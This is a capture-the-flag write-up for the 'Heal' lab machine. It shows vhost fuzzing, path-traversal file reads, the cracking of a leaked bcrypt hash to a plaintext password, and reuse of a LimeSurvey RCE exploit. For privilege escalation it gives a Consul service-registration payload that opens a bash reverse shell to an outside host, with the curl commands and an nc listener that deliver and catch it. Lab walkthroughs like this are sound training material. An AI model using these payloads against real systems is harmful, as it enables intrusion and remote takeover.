# HEAL

#### First steps

After some Fuzzing fo vhost i found api.heal.htb

```sh
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://heal.htb/ -H "Host: FUZZ.heal.htb" -fc 301
```

**Finding vulnerabilties**

While checking api.heal.htb, I noticed it mentions Ruby 3.3.5. I couldn't find any related vulnerabilities initially, so I continued my search for other potential issues. Fortunately, I discovered another VHOST `take-survey.heal.htb` and an `LFI vulnerability`. After some Googling, I found that the default Ruby database configuration file is located at `/config/database.yml`.

```js
GET /download?filename=../../config/database.yml
```

The result mentionned the sqlite3 real path :

```js
GET /download?filename=../../storage/development.sqlite3
```

Here we are , a username and a password hash :) lets jhon it .

```js
ralph@heal.htb$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG2024-09-27 
```

```d
real hash part : $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
```

**Cracking the Hash**

The hash is compatible with Hashcat. Use the following command to crack it:

```d
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```d
Passwd : 147258369
```

The password cannot be used for SSH, so maybe there are other places where I can log in with ralph:147258369.

After some fuzzing on `take-survey.heal.htb`, I discovered the admin panel page and logged in using Ralph's credentials. Then, I started researching CMS vulnerabilities related to LimeSurvey version 6.6.4 and found the following: https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

Follow the steps and ull got the shell :)

***

After some exploration on the machine, I found the files containing the setup configurations. Among them, a few files stood out as particularly ==interesting,(Data base configuration files)==

```
cd /var/www/limesurvey/application/config/
```

I examined each file and tested their passwords on the other two users, Ralph and Ron. Eventually, the password from `config.php` worked for the user Ron.

```c
ron : AdmiDi0_pA$$w0rd
```

***

#### PRIVILEGE ESCALATION

I found some suspicious ports running on the localhost (`8500`, `8300`, `8600`) after checking the network with the command `netstat -l`. I forwarded these ports using the following command:

```sh
ssh -L 8500:127.0.0.1:8500 -L 8300:127.0.0.1:8300 -L 8600:127.0.0.1:8600 ron@10.10.11.46
```

Afterward, I checked if any of these ports were hosting an HTTP service and discovered that port `8500` was running Consul v1.19.2.

Through my research, I found that Consul v1.19.2 is vulnerable to Remote Code Execution (RCE) via the Services API.

source : https://github.com/owalid/consul-rce/blob/main/README.md

The provided Python exploit didn't work for me, so I decided to follow the process manually. Here’s the process:

#### 1. **Create the Malicious JSON Payload**

I created the following JSON file (`rev.json`), which contains a reverse shell command:

```json
{
    "Name": "pwn",
    "ID": "test-shell",
    "Port": 80,
    "Check": {
        "Args": [
            "/bin/bash",
            "-i",
            ">&",
            "/dev/tcp/10.10.14.81/1234",
            "0>&1"
        ],
        "Interval": "10s",
        "Timeout": "86400s"
    }
}
```

#### 2. **Send the Exploit Payload Using `curl`**

Next, I used the `curl` command to register the malicious service with the Consul agent:

```sh
curl -X PUT --data-binary @rev.json http://127.0.0.1:8500/v1/agent/service/register?replace-existing-checks=true
```

#### 3. **DeRegister the malicious shell**

I opened a listener on port `1234` to catch the reverse shell:

`nc -nlvp 1234`

```sh
curl -X PUT http://127.0.0.1:8500/v1/agent/service/deregister/test-shell
```

Once the service is degistred, I was able to receive the reverse shell.
